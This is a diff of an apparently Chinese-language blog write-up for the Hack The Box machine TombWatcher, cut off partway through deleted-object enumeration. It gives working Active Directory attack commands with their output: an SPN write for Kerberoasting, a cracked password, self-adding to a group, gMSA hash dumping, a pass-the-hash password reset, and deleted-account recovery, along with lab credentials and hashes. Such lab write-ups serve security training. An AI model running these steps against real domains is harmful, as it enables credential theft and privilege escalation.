@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="TombWatcher Domain User: henry &#x2F; H3nry_987TGV!  Attackter Kali: 10.10.16.19 Target:  10.129.62.74 信息收集： 端口扫描 sudo nmap -sS -Pn -p1-65535 10.129.62.74    域信息收集   WriteSPN  The user HENRY@TOMBWATCH">
+    <meta name="description" content="TombWatcher Domain User: henry &#x2F; H3nry_987TGV!  Attackter Kali: 10.10.16.19 Target:  10.129.62.74 信息收集： 端口扫描 sudo nmap -sS -Pn -p1-65535 10.129.62.74    域信息收集    横向移动 WriteSPN  The user HENRY@TOM">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HTB-TombWatcher">
 <meta property="og:url" content="https://3inter.net/2025/06/15/HTB-TombWatcher/index.html">
 <meta property="og:site_name" content="3inter&#39;s Blog">
-<meta property="og:description" content="TombWatcher Domain User: henry &#x2F; H3nry_987TGV!  Attackter Kali: 10.10.16.19 Target:  10.129.62.74 信息收集： 端口扫描 sudo nmap -sS -Pn -p1-65535 10.129.62.74    域信息收集   WriteSPN  The user HENRY@TOMBWATCH">
+<meta property="og:description" content="TombWatcher Domain User: henry &#x2F; H3nry_987TGV!  Attackter Kali: 10.10.16.19 Target:  10.129.62.74 信息收集： 端口扫描 sudo nmap -sS -Pn -p1-65535 10.129.62.74    域信息收集    横向移动 WriteSPN  The user HENRY@TOM">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://3inter.net/assets/image-20250613225625-9wfvlap.png">
 <meta property="og:image" content="https://3inter.net/assets/image-20250614235311-9mgxv4g.png">
@@ -26,8 +26,16 @@
 <meta property="og:image" content="https://3inter.net/assets/image-20250615102102-wwyetn5.png">
 <meta property="og:image" content="https://3inter.net/assets/image-20250615102130-0jvpw2q.png">
 <meta property="og:image" content="https://3inter.net/assets/image-20250615102143-49ovpyt.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250615165027-xxwqdxk.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250630133224-610cjd7.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250630133332-z83i29r.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250713200717-y9ngr3y.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250713201158-pkj7lqp.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250713201327-7i156uz.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250713201434-phxvrhf.png">
+<meta property="og:image" content="https://3inter.net/assets/image-20250713201619-xyk8tzx.png">
 <meta property="article:published_time" content="2025-06-15T02:33:07.000Z">
-<meta property="article:modified_time" content="2025-09-17T05:58:52.634Z">
+<meta property="article:modified_time" content="2025-09-25T07:07:07.359Z">
 <meta property="article:author" content="3inter">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://3inter.net/assets/image-20250613225625-9wfvlap.png">
@@ -156,7 +164,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TombWatcher"><span class="toc-number">1.</span> <span class="toc-text">TombWatcher</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集：</span></a></li></ol></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TombWatcher"><span class="toc-number">1.</span> <span class="toc-text">TombWatcher</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">1.2.</span> <span class="toc-text">横向移动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.3.</span> <span class="toc-text">域内权限提升</span></a></li></ol></li></ol>
     </div>
   </span>
 </div>
@@ -204,21 +212,23 @@
 <li><p>域信息收集</p>
 <p><img src="/assets/image-20250614235311-9mgxv4g.png" alt="image"></p>
 </li>
+</ul>
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><ul>
 <li><p>WriteSPN</p>
 <blockquote>
-<p>The user <a href="mailto:&#72;&#x45;&#78;&#82;&#89;&#x40;&#x54;&#79;&#x4d;&#x42;&#x57;&#x41;&#x54;&#67;&#x48;&#69;&#x52;&#46;&#x48;&#84;&#66;">HENRY@TOMBWATCHER.HTB</a> has the ability to write to the “serviceprincipalname” attribute to the user <a href="mailto:&#x41;&#76;&#x46;&#82;&#69;&#68;&#x40;&#84;&#x4f;&#x4d;&#66;&#87;&#x41;&#84;&#67;&#x48;&#x45;&#82;&#x2e;&#72;&#84;&#x42;">ALFRED@TOMBWATCHER.HTB</a>.</p>
+<p>The user <a href="mailto:&#72;&#x45;&#x4e;&#82;&#x59;&#x40;&#84;&#79;&#x4d;&#x42;&#87;&#65;&#84;&#x43;&#72;&#69;&#82;&#46;&#72;&#84;&#66;">HENRY@TOMBWATCHER.HTB</a> has the ability to write to the “serviceprincipalname” attribute to the user <a href="mailto:&#x41;&#76;&#x46;&#x52;&#69;&#68;&#x40;&#84;&#79;&#77;&#x42;&#x57;&#65;&#84;&#67;&#x48;&#69;&#x52;&#46;&#72;&#84;&#66;">ALFRED@TOMBWATCHER.HTB</a>.</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">──<span class="token punctuation">(</span>hello㉿world<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
-└─$ bloodyAD <span class="token parameter variable">-d</span> <span class="token string">"tombwatcher.htb"</span> <span class="token parameter variable">--host</span> <span class="token string">"10.129.62.74"</span> <span class="token parameter variable">-u</span> <span class="token string">"henry"</span> <span class="token parameter variable">-p</span> <span class="token string">"H3nry_987TGV\!"</span> <span class="token builtin class-name">set</span> object <span class="token string">"ALFRED"</span> servicePrincipalName <span class="token parameter variable">-v</span> <span class="token string">'MSSQLSvc/DC01.tombwatcher.htb:1433'</span>
+└─$ bloodyAD <span class="token parameter variable">-d</span> <span class="token string">"tombwatcher.htb"</span> <span class="token parameter variable">--host</span> <span class="token string">"10.129.29.246"</span> <span class="token parameter variable">-u</span> <span class="token string">"henry"</span> <span class="token parameter variable">-p</span> <span class="token string">"H3nry_987TGV\!"</span> <span class="token builtin class-name">set</span> object <span class="token string">"ALFRED"</span> servicePrincipalName <span class="token parameter variable">-v</span> <span class="token string">'MSSQLSvc/DC01.tombwatcher.htb:1433'</span>
 <span class="token punctuation">[</span>+<span class="token punctuation">]</span> ALFRED's servicePrincipalName has been updated<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="/assets/image-20250615000633-yza61g2.png" alt="image">​</p>
+<p><img src="/assets/image-20250615000633-yza61g2.png" alt="image"></p>
 <blockquote>
 <p>同步dc ntp server</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span> 
 timedatectl set-ntp off
-<span class="token function">date</span> <span class="token parameter variable">-n</span> DC01.tombwatcher.htb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+ntpdate <span class="token parameter variable">-n</span> DC01.tombwatcher.htb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
 <p>获取TG</p>
@@ -229,8 +239,7 @@ LDAP        <span class="token number">10.129</span>.29.246   <span class="token
 LDAP        <span class="token number">10.129</span>.29.246   <span class="token number">389</span>    DC01             Bypassing disabled account krbtgt 
 LDAP        <span class="token number">10.129</span>.29.246   <span class="token number">389</span>    DC01             <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Total of records returned <span class="token number">1</span>
 LDAP        <span class="token number">10.129</span>.29.246   <span class="token number">389</span>    DC01             sAMAccountName: Alfred memberOf:  pwdLastSet: <span class="token number">2025</span>-05-12 <span class="token number">11</span>:17:03.526670 lastLogon:<span class="token operator">&lt;</span>never<span class="token operator">></span>
-LDAP        <span class="token number">10.129</span>.29.246   <span class="token number">389</span>    DC01             <span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>Alfred<span class="token variable">$TOMBWATCHER</span>.HTB<span class="token variable">$tombwatcher</span>.htb/Alfred*<span class="token variable">$ac650f3d514ed1df4c535af624c0332e</span><span class="token variable">$e813a74002d71f93460ac56fffde0e5480bd170be93f9293ab21f270dc2910c97bb46cbc4e290f9e64591521e1ee31c4fb8c3ed795a756c76f44f2bf8344f902ab05460960a143eeaac8d36d31acbd00aed27e58f3f9ae1fbc3130ccdf69f2179453abf9632df2331f8a91f290cda1a80537d35f5009c50f499be88220b1d6c8979b091986ebed45fd51985ba7d613df6722382ad7d4db5cf59f484f430b95a1e55bdeac35b6644cd674d76071beb3b3a0e4c4ffb7ae8ccf8ed62acd129f0d74ea3bd517660d8ab1aca666e5fc7dcc52b1b03080092e90bd8638a0b2c72809e76b09ea647d086aa80b3e9ab84f2927810537e80abeff9baa2d2b6e4b9aa56e25bdae871bd18f1046b974ac7cf4ad3272ef0af5a1486873d23e0f1b73ef93b00151822b21090144d98dc58de2abbc5017170ea7cdf14e2087ddccc253b214d41728d2959847c631a6c61ff64c45ad3cddff6ae5596989311b482d013fbdda40a2ab07554f48725ae0390656f2927ff380ac14c184cddf1ce640b08eeecd52b9375fb2123474df4308961c7b6dabd4ee74b8bcc198c7a75074b517e0141c5904f6933a9edda6a31dab8f0f83c3e160bfc2e98247c1d42a9f689e47b7c6e6c0a38d9301d3f59009384a0e88ab97d2eba7767e1032474608c7168830032e89dc65243bc0bf1d1b488dcb433c63333f599394643096940400565d3d7f7ddee29edc47e082e2ce5edce018528f49dca353441ef8ff4fb1b3978c3915f58b90436866008eba2f271fd8dbf8fd1ceeac8ba6b10d24ae417bed877038b9e4495dcb196527e3a3d50567d02c15cc090c0b587c5f0e72433fcbdca5641f64e3733550aafd739c368323ee07ab89b4a09cd0287de48c33d54da8106333a8ec2042939ed80f1fc1e592f8a21aa7eb74b335b5c0fede52f7f4c97f04e1f1bfdc6726f3895039c6b6a76a37bccd4e9d7c5c501f85424ead716f6b2a7d571358f741e65a2ddee1941aad3fd42436032879e87fae4e9e8dcfc5eabcac6961a13f864f66a9d0884b8b52d7cd4c15c8f6d9062575976501885b6b249bd4db08cd48d3d571d664236cc7dd456100643d0ff737cd835c206942edd0b07ae08eb21917752f8bd989be0dfe2bb393a8f0dcb7e1d4ff247c7f6d0eb54f13522e26b6c49c6e27d94b2265ce1bccdb275d082d77969142f3e6cfdbc2bb0b09d36ae16feca30dab9f2160b63e51ae8affa6cfb0ac4ea107d613f10e6f8580b6df0dde0658542e144a88c34d798243a422a599c0bd40ae5dc773c3d857f7db4b7f1a7aab96c1c0c39abae23658b224bf91392e20b68ab7eb3fc4a7e5f4243f4e06fe0964a41a797a9f055542bb973ebd1ecc84680a9443441b605029c398f2ffc81aabc3c5be0919b9f37d139dd489a1080bdbc2f3db5afb26ada437d9e94da61d3cc6df46e10bce694c7372d505487c8f7346139f354e87ed5c6e1757c0a08fcb52ea</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+LDAP        <span class="token number">10.129</span>.29.246   <span class="token number">389</span>    DC01             <span class="token variable">$krb5tgs</span><span class="token variable">$23</span><span class="token variable">$*</span>Alfred<span class="token variable">$TOMBWATCHER</span>.HTB<span class="token variable">$tombwatcher</span>.htb/Alfred*<span class="token variable">$ac650f3d514ed1df4c535af624c0332e</span><span class="token variable">$e813a74002d71f93460ac56fffde0e5480bd170be93f9293ab21f270dc2910c97bb46cbc4e290f9e64591521e1ee31c4fb8c3ed795a756c76f44f2bf8344f902ab05460960a143eeaac8d36d31acbd00aed27e58f3f9ae1fbc3130ccdf69f2179453abf9632df2331f8a91f290cda1a80537d35f5009c50f499be88220b1d6c8979b091986ebed45fd51985ba7d613df6722382ad7d4db5cf59f484f430b95a1e55bdeac35b6644cd674d76071beb3b3a0e4c4ffb7ae8ccf8ed62acd129f0d74ea3bd517660d8ab1aca666e5fc7dcc52b1b03080092e90bd8638a0b2c72809e76b09ea647d086aa80b3e9ab84f2927810537e80abeff9baa2d2b6e4b9aa56e25bdae871bd18f1046b974ac7cf4ad3272ef0af5a1486873d23e0f1b73ef93b00151822b21090144d98dc58de2abbc5017170ea7cdf14e2087ddccc253b214d41728d2959847c631a6c61ff64c45ad3cddff6ae5596989311b482d013fbdda40a2ab07554f48725ae0390656f2927ff380ac14c184cddf1ce640b08eeecd52b9375fb2123474df4308961c7b6dabd4ee74b8bcc198c7a75074b517e0141c5904f6933a9edda6a31dab8f0f83c3e160bfc2e98247c1d42a9f689e47b7c6e6c0a38d9301d3f59009384a0e88ab97d2eba7767e1032474608c7168830032e89dc65243bc0bf1d1b488dcb433c63333f599394643096940400565d3d7f7ddee29edc47e082e2ce5edce018528f49dca353441ef8ff4fb1b3978c3915f58b90436866008eba2f271fd8dbf8fd1ceeac8ba6b10d24ae417bed877038b9e4495dcb196527e3a3d50567d02c15cc090c0b587c5f0e72433fcbdca5641f64e3733550aafd739c368323ee07ab89b4a09cd0287de48c33d54da8106333a8ec2042939ed80f1fc1e592f8a21aa7eb74b335b5c0fede52f7f4c97f04e1f1bfdc6726f3895039c6b6a76a37bccd4e9d7c5c501f85424ead716f6b2a7d571358f741e65a2ddee1941aad3fd42436032879e87fae4e9e8dcfc5eabcac6961a13f864f66a9d0884b8b52d7cd4c15c8f6d9062575976501885b6b249bd4db08cd48d3d571d664236cc7dd456100643d0ff737cd835c206942edd0b07ae08eb21917752f8bd989be0dfe2bb393a8f0dcb7e1d4ff247c7f6d0eb54f13522e26b6c49c6e27d94b2265ce1bccdb275d082d77969142f3e6cfdbc2bb0b09d36ae16feca30dab9f2160b63e51ae8affa6cfb0ac4ea107d613f10e6f8580b6df0dde0658542e144a88c34d798243a422a599c0bd40ae5dc773c3d857f7db4b7f1a7aab96c1c0c39abae23658b224bf91392e20b68ab7eb3fc4a7e5f4243f4e06fe0964a41a797a9f055542bb973ebd1ecc84680a9443441b605029c398f2ffc81aabc3c5be0919b9f37d139dd489a1080bdbc2f3db5afb26ada437d9e94da61d3cc6df46e10bce694c7372d505487c8f7346139f354e87ed5c6e1757c0a08fcb52ea</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/assets/image-20250615003623-y05xlj6.png" alt="image"></p>
 <blockquote>
@@ -241,20 +250,13 @@ LDAP        <span class="token number">10.129</span>.29.246   <span class="token
 <p><img src="/assets/image-20250615004055-1bdk5r8.png" alt="image"></p>
 <p><img src="/assets/image-20250615003912-ikbpf7z.png" alt="image"></p>
 <p>获取第二个用户账户权限，用户名:<strong>Alfred</strong>    密码:<strong>basketball</strong></p>
-<blockquote>
 <p>alfred对INFRASTRUCTURE组有AddSelf权限，可以将alfred自身加入目标INFRASTRUCTURE组</p>
-</blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ bloodyAD <span class="token parameter variable">-u</span> <span class="token string">'alfred'</span> <span class="token parameter variable">-p</span> <span class="token string">'basketball'</span> <span class="token parameter variable">-d</span> tombwatcher.htb --dc-ip <span class="token number">10.129</span>.29.246 <span class="token function">add</span> groupMember INFRASTRUCTURE alfred
 <span class="token punctuation">[</span>+<span class="token punctuation">]</span> alfred added to INFRASTRUCTURE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p><img src="/assets/image-20250615091226-g4gjyy2.png" alt="image"></p>
 <blockquote>
-<p>INFRASTRUCTURE组对ANSIBLE_DEV 用户有readGMSAPassword权限，而刚才alfred已经加入INFRASTRUCTURE组，alfred同样对ANSIBLE_DEV 用户有readGMSAPassword权限</p>
-</blockquote>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bloodyAD <span class="token parameter variable">-u</span> <span class="token string">'alfred'</span> <span class="token parameter variable">-p</span> <span class="token string">'basketball'</span> <span class="token parameter variable">-d</span> tombwatcher.htb --dc-ip <span class="token number">10.129</span>.29.246 <span class="token function">add</span> groupMember INFRASTRUCTURE alfred<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<blockquote>
-<p>获取ntlm hash</p>
+<p>INFRASTRUCTURE组对ANSIBLE_DEV 用户有readGMSAPassword权限，而刚才alfred已经加入INFRASTRUCTURE组，alfred同样对ANSIBLE_DEV 用户有readGMSAPassword权限，获取ntlm hash</p>
 </blockquote>
 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ <span class="token function">sudo</span> python gMSADumper.py <span class="token parameter variable">-u</span> <span class="token string">'ALFRED'</span> <span class="token parameter variable">-p</span> <span class="token string">'basketball'</span> <span class="token parameter variable">-d</span> <span class="token string">'tombwatcher.htb'</span>                                         
 Users or <span class="token function">groups</span> <span class="token function">who</span> can <span class="token builtin class-name">read</span> password <span class="token keyword">for</span> ansible_dev$:
@@ -266,7 +268,7 @@ ansible_dev$:aes128-cts-hmac-sha1-96:230ccd9df374b5fad6a322c5d7410226<span aria-
 <blockquote>
 <p>ansible_dev$机器账户，又发现其对SAM账户有<strong>ForceChangePassword</strong>权限，可以强制修改SAM的密码</p>
 </blockquote>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ pth-net rpc password <span class="token string">"SAM"</span> <span class="token string">"HackTheBox"</span> <span class="token parameter variable">-U</span> <span class="token string">"tombwatcher.htb"</span>/<span class="token string">"ansible_dev$"</span>%<span class="token string">"ffffffffffffffffffffffffffffffff"</span><span class="token builtin class-name">:</span><span class="token string">"4b21348ca4a9edff9689cdf75cbda439"</span> <span class="token parameter variable">-S</span> <span class="token string">"10.129.29.246"</span>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ net rpc password <span class="token string">"SAM"</span> <span class="token string">"HackTheBox"</span> <span class="token parameter variable">-U</span> <span class="token string">"tombwatcher.htb"</span>/<span class="token string">"ansible_dev$"</span>%<span class="token string">"ffffffffffffffffffffffffffffffff"</span><span class="token builtin class-name">:</span><span class="token string">"4b21348ca4a9edff9689cdf75cbda439"</span> <span class="token parameter variable">-S</span> <span class="token string">"10.129.29.246"</span>
 E_md4hash wrapper called.
 HASH PASS: Substituting user supplied NTLM HASH<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
@@ -315,8 +317,189 @@ SMB         <span class="token number">10.129</span>.29.246   <span class="token
 
 <p><img src="/assets/image-20250615102130-0jvpw2q.png" alt="image"></p>
 <p><img src="/assets/image-20250615102143-49ovpyt.png" alt="image"></p>
+<blockquote>
+<p>攻击路线 Review</p>
+</blockquote>
+<p><img src="/assets/image-20250615165027-xxwqdxk.png" alt="image"></p>
 </li>
 </ul>
+<h2 id="域内权限提升"><a href="#域内权限提升" class="headerlink" title="域内权限提升"></a>域内权限提升</h2><ul>
+<li><p>域内删除对象</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">*Evil-WinRM* PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>john<span class="token punctuation">\</span>Documents<span class="token operator">></span> Get-ADObject <span class="token parameter variable">-Filter</span> <span class="token string">'isDeleted -eq $true -and objectClass -eq "user"'</span> <span class="token parameter variable">-IncludeDeletedObjects</span> <span class="token parameter variable">-Properties</span> *
+
+
+accountExpires                  <span class="token builtin class-name">:</span> <span class="token number">9223372036854775807</span>
+badPasswordTime                 <span class="token builtin class-name">:</span> <span class="token number">0</span>
+badPwdCount                     <span class="token builtin class-name">:</span> <span class="token number">0</span>
+CanonicalName                   <span class="token builtin class-name">:</span> tombwatcher.htb/Deleted Objects/cert_admin
+                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
+CN                              <span class="token builtin class-name">:</span> cert_admin
+                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
+codePage                        <span class="token builtin class-name">:</span> <span class="token number">0</span>
+countryCode                     <span class="token builtin class-name">:</span> <span class="token number">0</span>
+Created                         <span class="token builtin class-name">:</span> <span class="token number">11</span>/15/2024 <span class="token number">7</span>:55:59 PM
+createTimeStamp                 <span class="token builtin class-name">:</span> <span class="token number">11</span>/15/2024 <span class="token number">7</span>:55:59 PM
+Deleted                         <span class="token builtin class-name">:</span> True
+Description                     <span class="token builtin class-name">:</span>
+DisplayName                     <span class="token builtin class-name">:</span>
+DistinguishedName               <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>cert_admin<span class="token punctuation">\</span>0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN<span class="token operator">=</span>Deleted Objects,DC<span class="token operator">=</span>tombwatcher,DC<span class="token operator">=</span>htb
+dSCorePropagationData           <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token number">11</span>/15/2024 <span class="token number">7</span>:56:05 PM, <span class="token number">11</span>/15/2024 <span class="token number">7</span>:56:02 PM, <span class="token number">12</span>/31/1600 <span class="token number">7</span>:00:01 PM<span class="token punctuation">&#125;</span>
+givenName                       <span class="token builtin class-name">:</span> cert_admin
+instanceType                    <span class="token builtin class-name">:</span> <span class="token number">4</span>
+isDeleted                       <span class="token builtin class-name">:</span> True
+LastKnownParent                 <span class="token builtin class-name">:</span> <span class="token assign-left variable">OU</span><span class="token operator">=</span>ADCS,DC<span class="token operator">=</span>tombwatcher,DC<span class="token operator">=</span>htb
+lastLogoff                      <span class="token builtin class-name">:</span> <span class="token number">0</span>
+lastLogon                       <span class="token builtin class-name">:</span> <span class="token number">0</span>
+logonCount                      <span class="token builtin class-name">:</span> <span class="token number">0</span>
+Modified                        <span class="token builtin class-name">:</span> <span class="token number">11</span>/15/2024 <span class="token number">7</span>:57:59 PM
+modifyTimeStamp                 <span class="token builtin class-name">:</span> <span class="token number">11</span>/15/2024 <span class="token number">7</span>:57:59 PM
+msDS-LastKnownRDN               <span class="token builtin class-name">:</span> cert_admin
+Name                            <span class="token builtin class-name">:</span> cert_admin
+                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
+nTSecurityDescriptor            <span class="token builtin class-name">:</span> System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  <span class="token builtin class-name">:</span>
+ObjectClass                     <span class="token builtin class-name">:</span> user
+ObjectGUID                      <span class="token builtin class-name">:</span> f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
+objectSid                       <span class="token builtin class-name">:</span> S-1-5-21-1392491010-1358638721-2126982587-1109
+primaryGroupID                  <span class="token builtin class-name">:</span> <span class="token number">513</span>
+ProtectedFromAccidentalDeletion <span class="token builtin class-name">:</span> False
+pwdLastSet                      <span class="token builtin class-name">:</span> <span class="token number">133761921597856970</span>
+sAMAccountName                  <span class="token builtin class-name">:</span> cert_admin
+sDRightsEffective               <span class="token builtin class-name">:</span> <span class="token number">7</span>
+sn                              <span class="token builtin class-name">:</span> cert_admin
+userAccountControl              <span class="token builtin class-name">:</span> <span class="token number">66048</span>
+uSNChanged                      <span class="token builtin class-name">:</span> <span class="token number">12975</span>
+uSNCreated                      <span class="token builtin class-name">:</span> <span class="token number">12844</span>
+whenChanged                     <span class="token builtin class-name">:</span> <span class="token number">11</span>/15/2024 <span class="token number">7</span>:57:59 PM
+whenCreated                     <span class="token builtin class-name">:</span> <span class="token number">11</span>/15/2024 <span class="token number">7</span>:55:59 PM
+
+accountExpires                  <span class="token builtin class-name">:</span> <span class="token number">9223372036854775807</span>
+badPasswordTime                 <span class="token builtin class-name">:</span> <span class="token number">0</span>
+badPwdCount                     <span class="token builtin class-name">:</span> <span class="token number">0</span>
+CanonicalName                   <span class="token builtin class-name">:</span> tombwatcher.htb/Deleted Objects/cert_admin
+                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
+CN                              <span class="token builtin class-name">:</span> cert_admin
+                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
+codePage                        <span class="token builtin class-name">:</span> <span class="token number">0</span>
+countryCode                     <span class="token builtin class-name">:</span> <span class="token number">0</span>
+Created                         <span class="token builtin class-name">:</span> <span class="token number">11</span>/16/2024 <span class="token number">12</span>:04:05 PM
+createTimeStamp                 <span class="token builtin class-name">:</span> <span class="token number">11</span>/16/2024 <span class="token number">12</span>:04:05 PM
+Deleted                         <span class="token builtin class-name">:</span> True
+Description                     <span class="token builtin class-name">:</span>
+DisplayName                     <span class="token builtin class-name">:</span>
+DistinguishedName               <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>cert_admin<span class="token punctuation">\</span>0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN<span class="token operator">=</span>Deleted Objects,DC<span class="token operator">=</span>tombwatcher,DC<span class="token operator">=</span>htb
+dSCorePropagationData           <span class="token builtin class-name">:</span> <span class="token punctuation">&#123;</span><span class="token number">11</span>/16/2024 <span class="token number">12</span>:04:18 PM, <span class="token number">11</span>/16/2024 <span class="token number">12</span>:04:08 PM, <span class="token number">12</span>/31/1600 <span class="token number">7</span>:00:00 PM<span class="token punctuation">&#125;</span>
+givenName                       <span class="token builtin class-name">:</span> cert_admin
+instanceType                    <span class="token builtin class-name">:</span> <span class="token number">4</span>
+isDeleted                       <span class="token builtin class-name">:</span> True
+LastKnownParent                 <span class="token builtin class-name">:</span> <span class="token assign-left variable">OU</span><span class="token operator">=</span>ADCS,DC<span class="token operator">=</span>tombwatcher,DC<span class="token operator">=</span>htb
+lastLogoff                      <span class="token builtin class-name">:</span> <span class="token number">0</span>
+lastLogon                       <span class="token builtin class-name">:</span> <span class="token number">0</span>
+logonCount                      <span class="token builtin class-name">:</span> <span class="token number">0</span>
+Modified                        <span class="token builtin class-name">:</span> <span class="token number">11</span>/16/2024 <span class="token number">12</span>:04:21 PM
+modifyTimeStamp                 <span class="token builtin class-name">:</span> <span class="token number">11</span>/16/2024 <span class="token number">12</span>:04:21 PM
+msDS-LastKnownRDN               <span class="token builtin class-name">:</span> cert_admin
+Name                            <span class="token builtin class-name">:</span> cert_admin
+                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
+nTSecurityDescriptor            <span class="token builtin class-name">:</span> System.DirectoryServices.ActiveDirectorySecurity
+ObjectCategory                  <span class="token builtin class-name">:</span>
+ObjectClass                     <span class="token builtin class-name">:</span> user
+ObjectGUID                      <span class="token builtin class-name">:</span> c1f1f0fe-df9c-494c-bf05-0679e181b358
+objectSid                       <span class="token builtin class-name">:</span> S-1-5-21-1392491010-1358638721-2126982587-1110
+primaryGroupID                  <span class="token builtin class-name">:</span> <span class="token number">513</span>
+ProtectedFromAccidentalDeletion <span class="token builtin class-name">:</span> False
+pwdLastSet                      <span class="token builtin class-name">:</span> <span class="token number">133762502455822446</span>
+sAMAccountName                  <span class="token builtin class-name">:</span> cert_admin
+sDRightsEffective               <span class="token builtin class-name">:</span> <span class="token number">7</span>
+sn                              <span class="token builtin class-name">:</span> cert_admin
+userAccountControl              <span class="token builtin class-name">:</span> <span class="token number">66048</span>
+uSNChanged                      <span class="token builtin class-name">:</span> <span class="token number">13171</span>
+uSNCreated                      <span class="token builtin class-name">:</span> <span class="token number">13161</span>
+whenChanged                     <span class="token builtin class-name">:</span> <span class="token number">11</span>/16/2024 <span class="token number">12</span>:04:21 PM
+whenCreated                     <span class="token builtin class-name">:</span> <span class="token number">11</span>/16/2024 <span class="token number">12</span>:04:05 PM
+
+accountExpires                  <span class="token builtin class-name">:</span> <span class="token number">9223372036854775807</span>
+badPasswordTime                 <span class="token builtin class-name">:</span> <span class="token number">0</span>
+badPwdCount                     <span class="token builtin class-name">:</span> <span class="token number">0</span>
+CanonicalName                   <span class="token builtin class-name">:</span> tombwatcher.htb/Deleted Objects/cert_admin
+                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+CN                              <span class="token builtin class-name">:</span> cert_admin
+                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
+codePage                        <span class="token builtin class-name">:</span> <span class="token number">0</span>
+countryCode                     <span class="token builtin class-name">:</span> <span class="token number">0</span>
+Created                         <span class="token builtin class-name">:</span> <span class="token number">11</span>/16/2024 <span class="token number">12</span>:07:04 PM
+createTimeStamp                 <span class="token builtin class-name">:</span> <span class="token number">11</span>/16/2024 <span class="token number">12</span>:07:04 PM
+Deleted                         <span class="token builtin class-name">:</span> True
+Description                     <span class="token builtin class-name">:</span>
+DisplayName                     <span class="token builtin class-name">:</span>
+DistinguishedName               <span class="token builtin class-name">:</span> <span class="token assign-left variable">CN</span><span class="token operator">=</span>cert_admin<span class="token punctuation">\</span>0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN<span class="token operator">=</span>Deleted Objects,DC<span class="token operator">=</span>tombwatcher,DC<span class="token operator">=</span>htb
